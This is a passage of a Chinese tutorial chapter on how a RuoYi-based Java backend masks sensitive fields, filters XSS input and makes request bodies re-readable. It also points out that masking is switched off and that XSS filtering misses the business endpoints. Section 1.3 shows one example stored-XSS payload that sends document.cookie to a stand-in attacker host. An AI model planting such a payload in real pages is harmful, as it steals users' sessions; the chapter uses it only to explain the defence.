# 第 10 章 · 脱敏 · XSS · 请求包装

> **第 9 章讲"拦截请求"，本章讲"清洗数据"。** 用户列表里的**手机号要不要直接显示 `13812345678`**？用户在"备注"里输入 `<script>alert(1)</script>`，会不会**在你的页面上执行**？一个 JSON 请求体，**为什么"只能读一次"成了框架的坑**？
>
> **看似是三件事，其实是同一条流水线的三个工位**：**进门的安检（XSS 入参清洗）→ 让包裹能反复拆（请求包装）→ 出货前的打码（脱敏出参）**。
>
> **本章第一次讲透**：① **脱敏**（`@Sensitive`）为什么挂在 **Jackson 序列化**上，而不是在 Service 里手动替换；② **XSS 过滤**（`XssFilter`）怎么靠 **Filter + Wrapper** 在"数据进门的第一站"清洗；③ **`RepeatableFilter` 为什么必须存在**（Servlet InputStream 只能读一次的血案）；④ 两个**必须坦白的事实**：**本项目的脱敏功能被一行 `return true` 关掉了**、**XSS 过滤只覆盖 `/system/*` 等三个前缀，业务接口其实没过滤**。

---

## 一、这部分是做什么的？

### 1.0 零基础先补概念（第一次读先看这里）

| 概念 | 大白话 | 本章的真实例子 |
|---|---|---|
| **序列化** | 把 Java 对象"翻译"成 JSON 文本，准备发给前端 | `SysUser` 对象 → `{"phonenumber":"138..."}` |
| **Jackson 序列化器** | 负责翻译某个字段的"小翻译官"，可以换人 | `SensitiveJsonSerializer`（`SensitiveJsonSerializer.java:35`） |
| **Filter（过滤器）** | 请求进 Spring MVC 之前经过的最外层关卡 | `XssFilter` 在 `DispatcherServlet` 之前清洗请求 |
| **Wrapper（包装器）** | 给请求套一层壳，重写 `getInputStream()` 等方法 | `RepeatedlyRequestWrapper` 让 body 能反复读（`RepeatedlyRequestWrapper.java:42`） |
| **XSS** | 把用户输入当成网页代码执行，从而偷 Cookie/冒充用户 | 昵称里塞 `<script>...</script>` |

**先记住三个工位**：**进门安检（XSS 清洗）→ 套可反复拆的膜（请求包装）→ 出门打码（脱敏）**。本章后面的顺序、Wrapper、序列化器，都是围绕这三个动作展开的。

### 1.1 三个工位，一句话

| 工位 | 方向 | 解决什么 | 核心组件 | 本项目状态 |
|---|---|---|---|---|
| **脱敏** | **出参**（服务器 → 前端） | 敏感字段**自动打码**（手机号 → `138****1234`） | `@Sensitive` + `SensitiveJsonSerializer` | **组件齐全，但被开关关掉了**（见 §4.4） |
| **XSS 过滤** | **入参**（前端 → 服务器） | 用户提交的**脚本/HTML 标签被清掉** | `XssFilter` + `XssHttpServletRequestWrapper` | **只覆盖 `/system/*` 等三个前缀**（见 §4.5） |
| **请求包装** | **基础设施** | 让请求体（JSON）**能被读多次** | `RepeatableFilter` + `RepeatedlyRequestWrapper` | **全站生效**（`/*`） |

### 1.2 为什么要"脱敏"？

**因为"能查到"不等于"该看到"。**

- 一个**管理员**看用户列表，看完整手机号**没问题**；
- 一个**普通客服**也调这个"用户列表"接口，**就不该看到完整手机号**（数据泄露风险）；
- 但接口是同一个、返回的是**同一个 `SysUser` 对象**——**怎么让同一次查询、对不同的人出不同的码？**

答案：**在"出口"（序列化成 JSON 的那一刻）做手脚**。这就是"脱敏"要干的活：**字段还是那个字段，只是在变成 JSON 文本时被替换成打码版。**

### 1.3 为什么要"XSS 过滤"？

**XSS（跨站脚本攻击）** 是最经典的 Web 漏洞之一：

```
用户在"昵称"里输入：  <script>fetch('http://黑客.com?c='+document.cookie)</script>
这个昵称被存进数据库
别人打开"用户列表"，页面把这个昵称当 HTML 渲染
→ 这段 script 在别人浏览器里执行 → 别人的登录 Cookie 被偷走
```

**根子是"把用户输入当成了代码执行"**。防御手段有两条路：

1. **存的时候清洗**（把 `<script>` 洗掉）——本项目 `XssFilter` 走的这条；
2. **显示的时候转义**（把 `<` 变成 `&lt;`）——前端模板引擎的活。

**本项目两条都用了**（后端 `XssFilter` + 前端框架自带转义），但**后端这条只覆盖了系统管理接口**（坦白点，见 §4.5）。

### 1.4 为什么要"请求包装"？

这是三个里**最"框架味"**、也最容易被忽略的一个。**它不是业务需求，是技术坑的补丁。**

**Servlet 规范里，请求体（`request.getInputStream()`）是"一次性"的**——读了就没了，**不能回退、不能再读**。

这在"过滤器链"里会出事：

```
Filter A（比如日志过滤器）读了 JSON 请求体
Filter B / 业务代码 想再读同一个请求体
→ 拿到的是空流 → 参数全丢了 → 报错或逻辑错乱
```

**`RepeatableFilter` 的使命**：在请求进门的**最外圈**，把请求体**整段读出来缓存到内存**，然后包一个"每次 `getInputStream()` 都返回一份新流"的 `Wrapper`。**这样后面的任何组件都能随便读，读几次都行。**

> **一句话记忆**：**脱敏是"出门打码"，XSS 是"进门安检"，请求包装是"给包裹套一层可反复拆的膜"。**

---

## 二、站在架构师 / 开发经理角度：为什么这么设计？

### 2.1 脱敏为什么挂在 Jackson，而不是写在 Service 里？

**新手最容易想到的写法**：在 Service 查完用户后，手动 `user.setPhone(DesensitizedUtil.mobilePhone(user.getPhone()))`。

**这种写法有三个致命问题**：

1. **会污染数据**：你把打码后的手机号写回了 `SysUser` 对象。**如果这个对象后面还要被别的地方用**（比如导出 Excel 要完整手机号、或者还要回写数据库），**就拿到假数据了**。
2. **漏一个就白干**：`SysUser` 会在几十个接口返回，**你得每个出口都记得脱敏**。忘一个 = 漏洞。
3. **无法按人区分**：同一次查询，管理员要全码、客服要打码——**Service 层不知道"谁在看"**（它只负责取数据）。

**正确的设计**：**把脱敏放在"序列化"这一层**（对象 → JSON 的转换），因为：

- **序列化是"出口的唯一关卡"**——任何对象要变成 JSON 返回给前端，**都得过这里**，不会漏；
- **不污染原对象**——`SysUser` 里存的还是完整手机号，**只是 JSON 里被替换了**；
- **可以按当前登录人判断**——序列化时可以读"当前是谁在请求"，**决定脱不脱**。

**技术落点**：Jackson 的 **`JsonSerializer` + `ContextualSerializer`**——给字段挂一个"自定义序列化器"，这个序列化器在"生成上下文时"（`createContextual`）能拿到**该字段上的注解**（`@Sensitive(strategy=...)`），从而知道**用哪种打码规则**。

**这就是"为什么注解长在字段上、逻辑跑在序列化器里"的原因。**

### 2.2 XSS 过滤为什么用 Filter + Wrapper？

**为什么不用 Spring MVC 的拦截器（Interceptor）或 AOP？**

- **Filter 是最外层**——在 Spring MVC 的 `DispatcherServlet` **之前**执行。**XSS 清洗越早越好**（脏数据别进到 Controller 的 `@RequestBody` 里）；
- **拦截器（`HandlerInterceptor`）在 `DispatcherServlet` 之后**——**那时请求体可能已经被解析过了**（比如 `@RequestBody` 已经反序列化成对象），**再清洗就晚了**；
- **要"改"请求参数**（把 `<script>` 洗掉），而 **Servlet 的 `HttpServletRequest` 接口没法直接改**——**得用"包装器模式"（Decorator）**：写一个 `XssHttpServletRequestWrapper` 继承 `HttpServletRequestWrapper`，**重写 `getParameter` / `getInputStream`，在返回值里做清洗**。

**所以必须"Filter + Wrapper"组合**：Filter 决定"要不要洗、洗哪些 URL"；Wrapper 负责"怎么把洗过的值返回给调用方"。

### 2.3 为什么过滤链里有"两个"顺序讲究？

`FilterConfig` 里注册了两个过滤器，**顺序是刻意排的**（`ruoyi-base/ruoyi-framework/src/main/java/com/ruoyi/framework/config/FilterConfig.java:36`）：

| 过滤器 | 注册方法 | Order | 为什么这个顺序 |
|---|---|---|---|
| **XssFilter** | `xssFilterRegistration()` `:44` | **`HIGHEST_PRECEDENCE`（最外层）** `:50` | **安检要在最门口**——数据一进门就洗，后面的组件拿到的是干净的 |
| **RepeatableFilter** | `someFilterRegistration()` `:59` | **`LOWEST_PRECEDENCE`（最内层）** `:64` | **"可反复读的膜"要包在最靠近业务的地方**——先让 XSS 洗好，再缓存"洗净后"的请求体 |

**顺序的逻辑**：**外层先洗（XssFilter），内层再包成可重复读（RepeatableFilter）**。这样缓存下来的请求体**已经是洗过的**，后续谁都拿到干净且可重复读的数据。

### 2.4 XSS 过滤为什么"跳过 GET/DELETE"？

`XssFilter.handleExcludeURL`（`ruoyi-base/ruoyi-common/src/main/java/com/ruoyi/common/filter/XssFilter.java:60`）里有一句：

```java
// :64  如果是 GET 或 DELETE 请求，直接放行（不包装）
if (HttpMethod.GET.name().equals(method) || HttpMethod.DELETE.name().equals(method)) {
    filterChain.doFilter(request, response);
    return;
}
```

**原因**：**GET/DELETE 一般不带请求体**，参数都在 URL query string 里。**而 URL 里的特殊字符本来就会被 Tomcat 拦截/编码**，XSS 风险低。**真正危险的是 POST/PUT 的 JSON 请求体**（用户可以塞任意 HTML/脚本）。

**这是"按风险分级处理"的典型思路**——**不搞一刀切，把性能开销花在真正有风险的地方**。

---

## 三、需要哪些技术？

| 技术点 | 是什么 | 在本项目哪里用到 | 关键类/方法 |
|---|---|---|---|
| **Jackson `JsonSerializer`** | 自定义字段的 JSON 序列化 | 脱敏 | `SensitiveJsonSerializer.serialize` `:40` |
| **Jackson `ContextualSerializer`** | 序列化时能读到"字段上的注解" | 脱敏（拿到 `@Sensitive` 的 strategy） | `SensitiveJsonSerializer.createContextual` `:51` |
| **Jackson `@JacksonAnnotationsInside`** | 注解里"内置"其他 Jackson 注解 | `@Sensitive` 里内置 `@JsonSerialize` | `Sensitive.java:33` |
| **枚举 + 函数式接口** | 把"打码规则"做成可配置的枚举 | `SensitiveStrategy`（每种策略一个 `Function`） | `SensitiveStrategy.java:33-59` |
| **Hutool `DesensitizedUtil`** | 现成的脱敏工具 | 手机号/身份证/邮箱打码 | `DesensitizedUtil.mobilePhone` 等 |
| **Servlet `Filter`** | 最外层的请求拦截 | XSS 过滤、请求包装 | `XssFilter`、`RepeatableFilter` |
| **`HttpServletRequestWrapper`** | 包装器模式，改写请求 | 清洗参数、缓存请求体 | `XssHttpServletRequestWrapper`、`RepeatedlyRequestWrapper` |
| **`FilterRegistrationBean`** | Spring Boot 注册 Filter 并控制顺序 | Filter 装配 | `FilterConfig.java:43-65` |
| **`@ConditionalOnProperty`** | 按配置开关决定是否注册 Bean | XSS 过滤可开关 | `FilterConfig.java:43`（读 `xss.enabled`） |
| **正则 + Hutool `HtmlUtil`** | 匹配并清理 HTML 标签 | XSS 清洗、`@Xss` 校验 | `HtmlUtil.RE_HTML_MARK`、`HtmlUtil.cleanHtmlTag` |
| **Jakarta Bean Validation（`javax`）** | 自定义校验注解 | `@Xss` 的另一种用法（出参之外的入参校验） | `XssValidator.java:30` |
| **`IoUtil`（Hutool）** | 读流为字符串 | 缓存请求体 | `RepeatedlyRequestWrapper.java:42` |

---

## 四、功能具体怎么实现（带着你读懂）

### 4.1 脱敏的"三件套"：注解 → 策略 → 序列化器

**第一件：注解 `@Sensitive`**（`ruoyi-base/ruoyi-common/src/main/java/com/ruoyi/common/annotation/Sensitive.java`）

```java
@Target(ElementType.FIELD)                                       // :32  只能打在"字段"上
@Retention(RetentionPolicy.RUNTIME)                              //       运行时生效（序列化时要读它）
@JacksonAnnotationsInside                                        // :33  ★关键：说明"我这个注解里内置了 Jackson 注解"
@JsonSerialize(using = SensitiveJsonSerializer.class)            // :34  ★关键：用我的自定义序列化器
public @interface Sensitive {
    SensitiveStrategy strategy();                                // :36  打码策略（哪种脱敏）
}
```

**读懂这两行关键注解**：

- `@JacksonAnnotationsInside`：**让 Jackson 在处理 `@Sensitive` 时，"连带"执行注解里的 `@JsonSerialize`**。这是 Jackson 的"注解组合"机制——**你可以把一组 Jackson 注解打包成一个业务注解**。
- `@JsonSerialize(using = SensitiveJsonSerializer.class)`：**告诉 Jackson——凡是被 `@Sensitive` 标记的字段，别用默认序列化，改用我的 `SensitiveJsonSerializer`**。

**所以用起来极其简单**（`ruoyi-base/ruoyi-common/src/main/java/com/ruoyi/common/core/domain/entity/SysUser.java`）：

```java
@Sensitive(strategy = SensitiveStrategy.EMAIL)     // :91   邮箱
private String email;                              // :95

@Sensitive(strategy = SensitiveStrategy.PHONE)     // :100  手机号
private String phonenumber;                        // :102
```

**第二件：策略枚举 `SensitiveStrategy`**（`ruoyi-base/ruoyi-common/src/main/java/com/ruoyi/common/enums/SensitiveStrategy.java:28`）

```java
public enum SensitiveStrategy {
    ID_CARD(s -> DesensitizedUtil.idCardNum(s, 3, 4)),     // :33  身份证：保留前3后4
    PHONE(DesensitizedUtil::mobilePhone),                  // :38  手机号：138****1234
    ADDRESS(s -> DesensitizedUtil.address(s, 8)),          // :43  地址：保留前8
    EMAIL(DesensitizedUtil::email),                        // :48  邮箱：a***@qq.com
    BANK_CARD(DesensitizedUtil::bankCard);                 // :53  银行卡

    private final Function<String, String> desensitizer;   // :57  ★每种策略就是一个"字符串→字符串"的函数

    public Function<String, String> desensitizer() {       // :59
        return desensitizer;
    }
}
```

**精妙之处**：**把"打码规则"抽象成一个 `Function<String,String>`**。要加一种新脱敏（比如"车牌号"），**只需在枚举里加一行**，序列化器一行都不用改。**这是"开闭原则"的轻量落地——对扩展开放（加枚举项），对修改关闭（改序列化器）。**

**第三件：序列化器 `SensitiveJsonSerializer`**（`ruoyi-base/ruoyi-common/src/main/java/com/ruoyi/common/jackson/SensitiveJsonSerializer.java:35`）

```java
public class SensitiveJsonSerializer extends JsonSerializer<String>
        implements ContextualSerializer {                  // :35   ★既要"能序列化"，又要"能拿上下文"

    private SensitiveStrategy strategy;                    // :37 当前字段要用的策略

    @Override
    public void serialize(String value, JsonGenerator gen, SerializerProvider serializers)
            throws IOException {                           // :40
        SensitiveService sensitiveService = SpringUtils.getBean(SensitiveService.class);  // :41 拿"开关"服务
        if (sensitiveService.isSensitive()) {              // :42 ★如果"开关"说"不脱敏"
            gen.writeString(value);                        // :43 ★原样输出（RAW）
        } else {
            gen.writeString(strategy.desensitizer().apply(value));  // :45 ★用策略打码后输出
        }
    }

    @Override
    public JsonSerializer<?> createContextual(SerializerProvider prov, BeanProperty property) {  // :51
        Sensitive annotation = property.getAnnotation(Sensitive.class);  // :52 ★读到字段上的 @Sensitive
        if (Objects.nonNull(annotation) && Objects.equals(String.class, property.getType().getRawClass())) {  // :53
            this.strategy = annotation.strategy();         // :54 ★取出 strategy
            return this;                                   // :55 用这个序列化器
        }
        return prov.findValueSerializer(property.getType(), property);  // :57 没注解/不是 String 就走默认序列化器
    }
}
```

**逐行读（`SensitiveJsonSerializer.java:40-57`）**：

| 行 | 代码在干什么 | 为什么这么写 |
|---|---|---|
| `40` | `serialize` 真正把字段值写进 JSON | 这是"出口"最后一道工序，所有返回值都要经过 |
| `41` | 从 Spring 容器取 `SensitiveService` 实现 | 序列化器在 `ruoyi-common`，"是否脱敏"的实现可能在 `ruoyi-system`，只能运行期按接口取 |
| `42` | 问开关："现在要脱敏吗？" | 把"脱不脱"做成可配置策略，而不是写死在序列化器里 |
| `43` | 开关返回 `true` → 原样写值 | 本项目永远走这里（`return true`），所以手机号是明文 |
| `45` | 否则用 `strategy` 对应的函数打码 | 策略来自字段注解，比如 `PHONE` → `138****5678` |
| `52` | 在序列化某字段时，反查它有没有 `@Sensitive` | 这是"注解在字段上、逻辑在序列化器里"的接线处 |
| `53` | 只有"有注解且字段是 `String`"才接管 | `JsonSerializer<String>` 只能处理字符串，非 String 字段交给默认序列化器 |
| `54-55` | 把注解里的 `strategy` 存到当前实例并返回自己 | 接下来 `serialize` 就知道该用哪条打码规则 |
| `57` | 不符合条件 → 交回 Jackson 默认实现 | 不干扰没标注解的字段 |

**逐点读懂**：

- **`extends JsonSerializer<String>`**：一个字段序列化器，**只处理 `String` 类型**（所以 `@Sensitive` 只能打在 String 字段上——`@Target(FIELD)` 是字段级，但类型上是隐式约束）。
- **`implements ContextualSerializer`**：**这是"能读到字段注解"的关键**。Jackson 在序列化每个字段前会问它：**"这个字段有什么注解？你要不要定制？"**——`createContextual` 就是回答这个问题的。
- **`createContextual` 里的 `property.getAnnotation(Sensitive.class)`**：**这就是"注解长在字段上、逻辑跑在序列化器里"的接线处**——序列化器靠它**反查到该字段要用的 `strategy`**。
- **`SpringUtils.getBean(SensitiveService.class)`**：**依赖倒置的又一次出场**（和第 8 章一样）。序列化器在 `ruoyi-common`，而"开关"的实现 `SysSensitiveServiceImpl` 在 `ruoyi-system`——**common 不能依赖 system**，所以**用 Spring 容器按接口取**。

### 4.2 开关：`SensitiveService`

（`ruoyi-base/ruoyi-common/src/main/java/com/ruoyi/common/core/service/SensitiveService.java`）

```java
public interface SensitiveService {
    boolean isSensitive();        // :29  ★注意实际逻辑：返回 true = "不脱敏，原样输出"；false = 才打码（§4.3 会专门解释）
}
```

这是一个**SPI（服务提供接口）**——**common 定义接口，system 提供实现**。**这样"是否脱敏"变成了一个可替换的策略**（比如将来可以做"按环境/按租户决定脱不脱"）。

### 4.3 脱敏的完整判定链（画一遍）

```
字段上标了 @Sensitive(strategy=PHONE)
   ↓  Jackson 序列化该字段前
SensitiveJsonSerializer.createContextual()   ← 读到注解，拿到 strategy=PHONE
   ↓  真正序列化时
SensitiveJsonSerializer.serialize()
   ↓
SpringUtils.getBean(SensitiveService.class).isSensitive()
   ├── 返回 false（"要脱敏"）→ strategy.desensitizer().apply(value) → 138****1234
   └── 返回 true（"不脱敏"）→ gen.writeString(value)             → 13812345678 原样
```

**注意这里的命名有点绕**：方法名是 `isSensitive()`（"是否敏感"），**但从代码逻辑看，返回 `true` 走的是"原样输出"分支**——**意思是"（系统）按敏感处理了吗？是的 → 那就先别脱敏"**。**这在命名上是个坑**，读代码要**以逻辑为准，别以名字为准**（§4.4 会解释它为什么长这样）。

### 4.4 ★ 坦白点一：脱敏功能"一行代码"被关掉了

**这是本章最需要你记住的事实。** 看实现类（`ruoyi-base/ruoyi-system/src/main/java/com/ruoyi/system/service/impl/SysSensitiveServiceImpl.java`）：

```java
@Service                                                    // :28
public class SysSensitiveServiceImpl implements SensitiveService {

    @Override
    public boolean isSensitive() {                          // :35
        //先去掉脱敏功能                                       // :36  ★注释直接写了
        return true;                                        // :37  ★永远返回 true
    }
}
```

**推理一下后果**：

- `serialize` 里 `if (sensitiveService.isSensitive())` 分支——**因为永远返回 `true`，所以永远走 `gen.writeString(value)`**（原样输出）。
- **结论：本项目的脱敏"组件全在、接线全对，但开关永远指向"不脱敏"——所以项目里手机号/邮箱是明文输出的。**

**为什么要坦白？** 面试官如果问你"你们怎么做数据脱敏的"，**你要说"机制是这样（讲清 `@Sensitive` + 序列化器），但本项目实际上被一行 `return true` 关掉了"**——**这比硬说"我们脱敏了"强一百倍**。**主动暴露 + 讲清机制 = 你真的读懂了代码；硬编 = 一旦被追问"贴代码看看"就崩。**

**而且这里还藏着一个"命名与语义不一致"的教学点**：方法叫 `isSensitive`，返回 `true` 却表示"不脱敏"。**如果将来要真正开启脱敏，正确做法是把返回改成 `false`**（或者更彻底地重命名语义、反转逻辑）。**这就是"读别人代码时要看逻辑不要看名字"的活教材。**

> **顺带说明 `@Sensitive` 的实际使用范围**：全项目**只有 `SysUser` 的两个字段**用了（`SysUser.java:91` 邮箱、`SysUser.java:100` 手机号）。**所以你甚至可以说"这套脱敏是给用户表准备的，但因为开关关了，实际没生效"。**

### 4.5 XSS 过滤：Filter + Wrapper 的两段式

**第一段：`XssFilter` 决定"洗不洗"**（`ruoyi-base/ruoyi-common/src/main/java/com/ruoyi/common/filter/XssFilter.java:30`）

```java
public class XssFilter implements Filter {                 // :30
    public List<String> excludes = new ArrayList<>();      // :34 白名单（这些 URL 不洗）

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {  // :37
        String tempExcludes = filterConfig.getInitParameter("excludes");   // :38 从配置读"排除名单"
        if (StringUtils.isNotEmpty(tempExcludes)) {
            String[] url = tempExcludes.split(",");                         // :40
            for (int i = 0; url != null && i < url.length; i++) {
                excludes.add(url[i]);                                       // :42
            }
        }
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)  // :48
        throws IOException, ServletException {             // :49
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        if (handleExcludeURL(req, resp)) {                 // :52  ★判断"要不要放过"
            chain.doFilter(request, response);             // :53 放过：原样传递
            return;
        }
        XssHttpServletRequestWrapper xssRequest =
            new XssHttpServletRequestWrapper((HttpServletRequest) request);   // :56  ★要洗：包一层
        chain.doFilter(xssRequest, response);              // :57 把"洗过的请求"传下去
    }

    private boolean handleExcludeURL(HttpServletRequest request, HttpServletResponse response) {  // :60
        String url = request.getServletPath();             // :61
        String method = request.getMethod();               // :62
        // :63  GET / DELETE 不过滤（本项目原注释）
        if (method == null || method.matches("GET") || method.matches("DELETE")) {  // :64
            return true;
        }
        return StringUtils.matches(url, excludes);          // :67 命中"排除名单"也放过
    }
}
```

**第二段：`XssHttpServletRequestWrapper` 决定"怎么洗"**（`ruoyi-base/ruoyi-common/src/main/java/com/ruoyi/common/filter/XssHttpServletRequestWrapper.java:35`）

```java
public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper {   // :35

    @Override
    public String[] getParameterValues(String name) {      // :44  ★普通表单参数
        String[] values = super.getParameterValues(name);
        if (values != null) {
            int length = values.length;
            String[] escapseValues = new String[length];   // 逐个清洗
            for (int i = 0; i < length; i++) {
                // 防xss攻击和过滤前后空格
                escapseValues[i] = HtmlUtil.cleanHtmlTag(values[i]).trim();  // :51 ★清掉 HTML 标签
            }
            return escapseValues;
        }
        return super.getParameterValues(name);
    }

    @Override
    public ServletInputStream getInputStream() throws IOException {       // :59  ★JSON 请求体
        if (!isJsonRequest()) {                            // :61 非 JSON 直接返回原流
            return super.getInputStream();
        }
        String json = IoUtil.read(super.getInputStream(), StandardCharsets.UTF_8);  // :66 读原始请求体
        if (StringUtils.isEmpty(json)) {
            return super.getInputStream();                 // :68 空 body 直接返回
        }
        json = HtmlUtil.cleanHtmlTag(json).trim();         // :72 ★清洗后返回"清洗后的流"
        byte[] jsonBytes = json.getBytes(StandardCharsets.UTF_8);      // :73
        final ByteArrayInputStream bis = IoUtil.toStream(jsonBytes);   // :74
        return new ServletInputStream() { /* :75-99 每次 read() 都从上面的字节数组读 */ };
    }

    public boolean isJsonRequest() {                       // :107
        String header = super.getHeader(HttpHeaders.CONTENT_TYPE);   // :108
        return StringUtils.startsWithIgnoreCase(header, MediaType.APPLICATION_JSON_VALUE);  // :109 ★只看 JSON
    }
}
```

**读懂这里的"两条清洗通道"**：

1. **`getParameterValues`**：管 **form 表单 / URL 参数**（`key=value` 那种）——**逐个值清 HTML 标签**；
2. **`getInputStream`**：管 **JSON 请求体**（`{"remark":"<script>..."}`）——**把整个 body 清一遍**。

**为什么要分两条？** 因为 **Servlet 拿参数有两条路径**：`request.getParameter("x")`（走 form/query）和 `@RequestBody`（走 InputStream）。**只堵一条会漏另一条**——**这是"攻击面分析"的思路：把所有能进数据的入口都堵上。**

**清洗用的 `HtmlUtil.cleanHtmlTag`**：Hutool 的工具，**把 `<...>` 这种标签整体去掉**。比正则自己写靠谱（Hutool 处理了各种边角）。

**第三段（可选）：`@Xss` 校验注解**（另一条路）

除了"过滤"，还有"校验"这条互补的路：

```java
// ruoyi-base/ruoyi-common/src/main/java/com/ruoyi/common/xss/Xss.java
@Constraint(validatedBy = { XssValidator.class })                    // :30  用这个校验器
public @interface Xss {
    String message() default "不允许任何脚本运行";                     // :33
}

// ruoyi-base/ruoyi-common/src/main/java/com/ruoyi/common/xss/XssValidator.java
public boolean isValid(String value, ConstraintValidatorContext context) {   // :30
    // :31  用正则 RE_HTML_MARK 检查是否"含 HTML 标签"；含 → 校验失败
    return !ReUtil.contains(HtmlUtil.RE_HTML_MARK, value);
}
```

**区别**：`XssFilter` 是"**直接洗掉**"（用户无感，数据被静默修改）；`@Xss` 是"**校验报错**"（告诉用户"你输入了非法内容"）。**前者适合"宽松清洗"，后者适合"严格拒绝"。本项目主要是 Filter 路线，`@Xss` 注解用得很少。**

### 4.6 请求包装：`RepeatableFilter` + `RepeatedlyRequestWrapper`

**先记住问题**：`request.getInputStream()` **只能读一次**。

**`RepeatableFilter`：只包 JSON 请求**（`ruoyi-base/ruoyi-common/src/main/java/com/ruoyi/common/filter/RepeatableFilter.java:28`）

```java
public class RepeatableFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) {   // :35
        ServletRequest requestWrapper = null;
        // :38  ★只有 JSON 请求才包装（form 表单参数本来就能反复读）
        if (request instanceof HttpServletRequest
                && StringUtils.startsWithIgnoreCase(request.getContentType(), MediaType.APPLICATION_JSON_VALUE)) {
            requestWrapper = new RepeatedlyRequestWrapper((HttpServletRequest) request, response);   // :40
        }
        if (requestWrapper == null) {
            chain.doFilter(request, response);
        } else {
            chain.doFilter(requestWrapper, response);      //       传递"可重复读的请求"
        }
    }
}
```

**读懂"为什么只包 JSON"**：**form 表单参数（`getParameter`）在 Servlet 里本来就被容器缓存了，可以反复读**；**只有请求体流（InputStream）是一次性的**。**所以只需要为 JSON 请求体打补丁**——**精准打击，不做无用功。**

**`RepeatedlyRequestWrapper`：把请求体缓存进内存**（`ruoyi-base/ruoyi-common/src/main/java/com/ruoyi/common/filter/RepeatedlyRequestWrapper.java:34`）

```java
public class RepeatedlyRequestWrapper extends HttpServletRequestWrapper {
    private final byte[] body;

    public RepeatedlyRequestWrapper(HttpServletRequest request, ServletResponse response) throws IOException {  // :37
        super(request);
        request.setCharacterEncoding("UTF-8");          // :39
        response.setCharacterEncoding("UTF-8");        // :40
        // :42  ★关键：把请求体一口气读成字节数组，缓存在字段里
        body = IoUtil.readUtf8(request.getInputStream()).getBytes(StandardCharsets.UTF_8);
    }

    @Override
    public ServletInputStream getInputStream() throws IOException {     // :51
        // ★每次调用都 new 一个"基于缓存 body 的新流"返回
        //   这样无论调用多少次，都从头开始读，可反复消费
    }
}
```

**核心思想一句话**：**"把一次性流，换成可重复读的字节数组"**。

- **构造时**：把请求体整段读进 `byte[] body`（**一次性读掉，存起来**）；
- **每次 `getInputStream()`**：返回一个 **`ByteArrayInputStream(body)`** 的新包装——**每次都是全新的流，从头读**。

**这就是"请求包装"的全部价值**：**它本身不服务任何业务，只是为了"让下游组件能安全地重复读请求体"**。**没有它，你的日志切面、参数校验、加解密拦截器、甚至 `@RequestBody` 之间就会"抢"请求体，谁先读谁赢，后面的拿空。**

### 4.7 FilterConfig：两个过滤器怎么装的

（`ruoyi-base/ruoyi-framework/src/main/java/com/ruoyi/framework/config/FilterConfig.java`）

```java
@Configuration
public class FilterConfig {                                  // :36

    @Autowired
    private XssProperties xssProperties;                     // :39

    @Bean
    @ConditionalOnProperty(value = "xss.enabled", havingValue = "true")   // :43  ★开关：配置为 true 才注册
    public FilterRegistrationBean xssFilterRegistration() { // :44
        FilterRegistrationBean registration = new FilterRegistrationBean();
        registration.setDispatcherTypes(DispatcherType.REQUEST);          // :46
        registration.setFilter(new XssFilter());
        registration.addUrlPatterns(StringUtils.split(xssProperties.getUrlPatterns(), ","));  // :48 只对配置的 URL 生效
        registration.setName("xssFilter");
        registration.setOrder(FilterRegistrationBean.HIGHEST_PRECEDENCE); // :50  ★最外层
        Map<String, String> initParameters = new HashMap<String, String>();
        initParameters.put("excludes", xssProperties.getExcludes());      // :52 白名单传给 Filter
        registration.setInitParameters(initParameters);
        return registration;
    }

    @Bean
    public FilterRegistrationBean someFilterRegistration() {              // :59
        FilterRegistrationBean registration = new FilterRegistrationBean();
        registration.setFilter(new RepeatableFilter());
        registration.addUrlPatterns("/*");                                // :62  ★全站生效
        registration.setName("repeatableFilter");
        registration.setOrder(FilterRegistrationBean.LOWEST_PRECEDENCE);  // :64  ★最内层
        return registration;
    }
}
```

**两条配置线的对比**：

| | XssFilter | RepeatableFilter |
|---|---|---|
| **开关** | `@ConditionalOnProperty("xss.enabled")` | 无（永远注册） |
| **URL 范围** | `xss.urlPatterns`（可配置） | `/*`（全站） |
| **Order** | HIGHEST（外层） | LOWEST（内层） |
| **为什么** | 安检只查重点区域 + 可关闭 | 请求包装是"基础设施"，全站都需要 |

**`@ConditionalOnProperty`** 是 Spring Boot 的"条件装配"——**配置 `xss.enabled: false` 时，这个 Filter Bean 根本不创建**。**这让 XSS 过滤变成一个可开关的选项**（有些项目怕误杀正常内容，会关掉它改成"输出时转义"）。

### 4.8 XSS 配置：`XssProperties` + `application.yml`

（`ruoyi-base/ruoyi-framework/src/main/java/com/ruoyi/framework/config/properties/XssProperties.java`）

```java
@ConfigurationProperties(prefix = "xss")        // :27  ★绑定 application.yml 里 xss.* 的配置
public class XssProperties {
    private Boolean enabled;                    // :33  是否启用
    private String excludes;                    // :38  排除名单（不洗的 URL）
    private String urlPatterns;                 // :43  生效的 URL 前缀
}
```

（`ruoyi-admin/src/main/resources/application.yml:313-319`）

```yaml
xss:
  enabled: true                                              # :315  启用
  excludes: /system/notice                                   # :317  公告接口不洗（公告里允许富文本 HTML）
  urlPatterns: /system/*,/monitor/*,/tool/*                  # :319  ★只对这三类 URL 生效
```

**看 `excludes: /system/notice`**：**通知公告的正文本来就要支持富文本（加粗、图片），如果被 XSS 洗掉就废了**——**所以把"公告编辑"接口放进白名单**。**这是"过滤要留后门"的典型：一刀切会误杀合法需求。**

### 4.9 ★ 坦白点二：XSS 过滤没盖到业务接口

**紧盯这行**：

```yaml
urlPatterns: /system/*,/monitor/*,/tool/*      # :319
```

**这意味着**：

```
✅ 生效：/system/user、/system/role、/monitor/online、/tool/gen ...
❌ 不生效：/contract/**、/form/**、/workflow/** ...  ← 业务模块的接口
```

**后果**：**业务模块（合同、表单、流程）的接口，XSS 过滤根本没挂上。** 合同备注、表单字段这些**用户可自由输入的地方，恰恰是最需要 XSS 防护的**，**但配置里没覆盖到。**

**为什么这样？** 大概率是**沿用 RuoYi 原版配置没改**——**原版 RuoYi 只有系统管理模块，`/system/*` 就是全部**；**这个项目在基座上加了业务模块，但 XSS 的 `urlPatterns` 忘了同步扩展。**

**这是"框架改造时的配置遗漏"的典型样本**，面试时是很好的**"我发现了框架的一个安全缺口"**素材：

